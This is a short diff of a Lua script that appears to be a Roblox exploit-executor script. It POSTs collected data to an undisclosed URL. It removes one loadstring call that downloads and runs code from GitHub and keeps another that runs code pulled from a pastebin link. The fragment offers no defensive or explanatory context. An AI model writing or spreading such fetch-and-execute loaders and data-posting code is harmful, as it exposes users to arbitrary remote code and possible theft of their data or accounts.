@@ -60,9 +60,7 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
- 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/PickleIsDaBest/Min/main/Skipt"))()
- 
+
 loadstring(game:HttpGet('https://pastebin.com/raw/Ycyen8AM'))()
  
 while true do
